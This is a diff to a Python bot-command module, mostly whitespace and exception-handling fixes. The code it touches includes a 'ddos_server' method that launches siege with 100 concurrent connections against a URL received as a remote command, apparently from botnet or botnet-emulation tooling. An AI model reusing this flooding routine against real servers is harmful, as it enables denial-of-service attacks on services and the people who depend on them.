@@ -22,15 +22,15 @@ class BotCommands(object):
         logging.info("default_command: %s" % kwargs)
 
     def ddos_server(self, url, timeout=30):
-	if self.ddos_process is not None:
-	    logging.debug("communicate with siege")
-	    stdout,stderr = self.ddos_process.communicate()
+        if self.ddos_process is not None:
+            logging.debug("communicate with siege")
+            stdout, stderr = self.ddos_process.communicate()
             logging.debug("siege stdout: %s"%stdout)
-	    logging.debug("siege stderr: %s"%stderr)
+            logging.debug("siege stderr: %s"%stderr)
 
         if url is not None and validators.url(url):
-	    cmdstr = "timeout -k {longerTimeout}s {longerTimeout}s siege -c 100 -t {timeout} {url}"\
-		.format(longerTimeout=timeout+2, timeout=timeout, url=url)
+            cmdstr = "timeout -k {longerTimeout}s {longerTimeout}s siege -c 100 -t {timeout} {url}" \
+                .format(longerTimeout=timeout + 2, timeout=timeout, url=url)
             logging.debug(cmdstr)
             self.ddos_process = subprocess.Popen(shlex.split(cmdstr))
         else:
@@ -71,10 +71,5 @@ def executeCurrentCommand(command):
     try:
         retval = methodToCall(cmdobject, **command["kwargs"])
         return retval
-    except TypeError:
-	logging.warning("Command %s(**%s) could not be executed: %s"%(command["command"], command["kwargs"], ex))
-
-if __name__ == '__main__':
-    logging.basicConfig(**emu_config.logging_config)
-
-
+    except TypeError as ex:
+        logging.warning("Command %s(**%s) could not be executed: %s"%(command["command"], command["kwargs"], ex))
